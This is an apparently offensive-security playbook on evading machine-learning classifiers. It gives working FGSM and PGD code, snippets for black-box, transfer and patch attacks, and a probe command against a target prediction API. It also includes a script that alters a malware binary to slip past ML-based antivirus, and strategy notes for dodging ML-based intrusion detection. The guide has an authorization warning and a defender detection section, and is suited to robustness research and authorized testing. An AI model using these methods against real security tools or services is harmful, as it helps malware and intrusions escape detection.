# Adversarial ML Evasion

Adversarial examples are inputs modified with small, deliberate perturbations that reliably
cause a trained classifier to produce incorrect predictions. The perturbation is typically
imperceptible to humans or functionally irrelevant, while the model's decision boundary is
crossed. This is distinct from LLM jailbreaks: the target is a trained discriminative model
(CNN, gradient-boosted tree, SVM, LSTM) served via an API or embedded in a product.

> **Authorized use only.** All testing must be conducted against systems you own or have
> explicit written permission to assess. Generating adversarial inputs against production
> ML APIs without authorization may violate the CFAA and equivalent statutes.

## ATT&CK Mapping

| Technique | Use |
|---|---|
| T1562.001 — Impair Defenses: Disable or Modify Tools | Evade ML-based AV/EDR/IDS |
| T1036 — Masquerading | Make malicious content look benign to a classifier |
| T1027 — Obfuscated Files or Information | Perturb a file/image to fool static ML analysis |

---

## 1. Reconnaissance — understand the target model

Before crafting perturbations, determine the attack surface:

```bash
# 1a. Identify the ML stack from job postings, open-source repos, error messages
# Common deployment stacks: TensorFlow Serving, TorchServe, ONNX Runtime, SageMaker, AzureML

# 1b. Probe input shape and output format
curl -s -X POST "$TARGET/predict" \
  -H "Content-Type: application/json" \
  -d '{"data": [[0.0]*784]}' | jq .
# Note: number of output classes, confidence scores vs hard labels
# Confidence scores = white-box-equivalent gradient signal via finite differences

# 1c. Check if the API returns confidence values (score-based black-box) or label only (hard-label)
# Score-based: enables gradient estimation, ZOO, NES attacks
# Label-only: requires hard-label attacks (HopSkipJump, QEBA)
```

---

## 2. White-box evasion (full model access)

Use when you have the model weights (pentest scope, internal system, open-source model).

### 2a. FGSM — Fast Gradient Sign Method (single step)

```python
import torch, torchvision.transforms as T
from PIL import Image
import requests, json

def fgsm(model, x, y_true, epsilon=0.03):
    """Single-step gradient attack. Fast, low distortion for strong models."""
    x.requires_grad_(True)
    loss = torch.nn.CrossEntropyLoss()(model(x), y_true)
    loss.backward()
    return (x + epsilon * x.grad.sign()).clamp(0, 1).detach()
```

### 2b. PGD — Projected Gradient Descent (iterative, stronger)

```python
def pgd(model, x, y_true, epsilon=0.03, alpha=0.007, steps=40):
    """Madry's PGD — iterative FGSM with projection back into epsilon-ball."""
    x_adv = x.clone().detach().requires_grad_(True)
    for _ in range(steps):
        loss = torch.nn.CrossEntropyLoss()(model(x_adv), y_true)
        loss.backward()
        with torch.no_grad():
            x_adv = x_adv + alpha * x_adv.grad.sign()
            delta = torch.clamp(x_adv - x, -epsilon, epsilon)
            x_adv = torch.clamp(x + delta, 0, 1).detach().requires_grad_(True)
    return x_adv
```

### 2c. C&W — Carlini & Wagner (optimization-based, minimal distortion)

```bash
pip install adversarial-robustness-toolbox  # IBM ART
python - <<'EOF'
from art.attacks.evasion import CarliniL2Method
from art.estimators.classification import PyTorchClassifier
# wrap your model in PyTorchClassifier, then:
attack = CarliniL2Method(classifier=clf, confidence=0.5, max_iter=100)
x_adv = attack.generate(x=x_test[:10])
EOF
```

---

## 3. Black-box evasion (API access only)

### 3a. Score-based: NES / ZOO (gradient-free estimation)

When confidence scores are returned, estimate gradient via finite differences:

```python
import numpy as np

def nes_gradient_estimate(query_fn, x, sigma=0.01, n=50):
    """Natural Evolution Strategy gradient estimate from prediction scores."""
    grads = np.zeros_like(x)
    for _ in range(n):
        noise = np.random.randn(*x.shape)
        pos = query_fn(x + sigma * noise)
        neg = query_fn(x - sigma * noise)
        grads += (pos - neg) * noise
    return grads / (2 * n * sigma)

# query_fn: callable that sends x to the API and returns target-class score
# Use grads to step: x_adv = x - alpha * np.sign(grads)
```

### 3b. Transfer attack (surrogate model)

The reference approach from 13o-bbr-bbq/machine_learning_security's CNN_test:

```bash
# 1. Collect input samples via normal API usage
# 2. Train a local surrogate on (input, label) pairs
# 3. Run white-box attack (FGSM/PGD) against surrogate
# 4. Transfer adversarial examples to the target
# Transferability is high when surrogate and target share architecture family

pip install cleverhans
python - <<'EOF'
import tensorflow as tf
from cleverhans.tf2.attacks.fast_gradient_method import fast_gradient_method
# Build surrogate_model from collected (x, y) pairs
x_adv = fast_gradient_method(surrogate_model, x_test, eps=0.03, norm=np.inf)
# Submit x_adv to the black-box API
EOF
```

### 3c. Hard-label: HopSkipJump

When only the predicted label is returned (no scores):

```bash
python - <<'EOF'
from art.attacks.evasion import HopSkipJump
from art.estimators.classification import BlackBoxClassifier

def predict_fn(x):
    # Call your API here, return one-hot array
    ...

clf = BlackBoxClassifier(predict_fn, input_shape=(32,32,3), nb_classes=10)
attack = HopSkipJump(classifier=clf, max_iter=50, max_eval=1000)
x_adv = attack.generate(x=x_test[:5])
EOF
```

---

## 4. Physical-world / domain-specific attacks

### 4a. Adversarial patches (object detection, face recognition)

Craft a printable patch that fools YOLO/RetinaNet regardless of placement:

```bash
pip install adversarial-robustness-toolbox
python - <<'EOF'
from art.attacks.evasion import AdversarialPatch
attack = AdversarialPatch(classifier=clf, rotation_max=22.5, scale_min=0.1, scale_max=1.0)
patch, mask = attack.generate(x=x_train[:100])
# Print patch, affix to subject — fools real-time camera-based classifiers
EOF
```

### 4b. Malware binary perturbation (AV/EDR evasion)

For ML-based static AV/EDR (MalConv, EMBER model):

```bash
# Append bytes to DOS overlay — does not affect execution, changes feature vector
python - <<'EOF'
import lief, numpy as np

binary = lief.parse("sample.exe")
# Append random payload to avoid changing import table / section headers
binary.dos_stub = bytes(np.random.randint(0, 256, 64))
builder = lief.PE.Builder(binary)
builder.build()
builder.write("sample_adv.exe")
# Iterate: score the modified binary against the target ML model
# Stop when target-class score drops below threshold
EOF
```

### 4c. Network traffic / IDS evasion

For ML-based IDS (random-forest or neural-net on flow features):

```bash
# Identify mutable features: packet timing, padding, flow ordering
# Immutable: payload content that triggers the attack itself
# Strategy: inflate packet-count, adjust inter-arrival times to move
# feature vector away from known-malicious region

scapy - <<'EOF'
from scapy.all import *
# Add benign-looking padding packets to inflate flow duration
# Shift timing to match benign profile learned from surrogate
EOF
```

## 5. Tooling reference

| Tool | Attack type | Notes |
|---|---|---|
| IBM ART (`adversarial-robustness-toolbox`) | White+black-box, patches, physical | Best all-round; PyTorch/TF/Sklearn |
| CleverHans | White-box FGSM/PGD | TF2 native |
| Foolbox | White+black-box | NumPy-first, easy API |
| AutoZOOM | Black-box score-based | Autoencoder-based gradient compression |
| deep-pwning | Legacy Metasploit-style | Largely unmaintained |

```bash
pip install adversarial-robustness-toolbox foolbox cleverhans
```

---

## 6. Validation checklist

- [ ] Clean input correctly classified before perturbation (baseline confirmed)
- [ ] Adversarial input misclassified at the same model endpoint
- [ ] Perturbation is within declared epsilon-ball (L-inf or L2 norm verified)
- [ ] For transfer: adversarial success rate on black-box > 30% (non-trivial transfer)
- [ ] For physical: photograph and re-score — confirm printed patch works under camera

---

## 7. Detection signals (defender perspective)

- Input pixel distribution deviates from natural image statistics (high-frequency noise)
- Feature-squeeze defence: score changes drastically when input is median-filtered
- Input preprocessing (JPEG re-encode, resize+crop) breaks gradient-based perturbations
- Ensemble disagreement: 3 models with different architectures disagree on the adversarial input
- Activation distribution of adversarial inputs differs from clean examples (mahalanobis-distance detector)
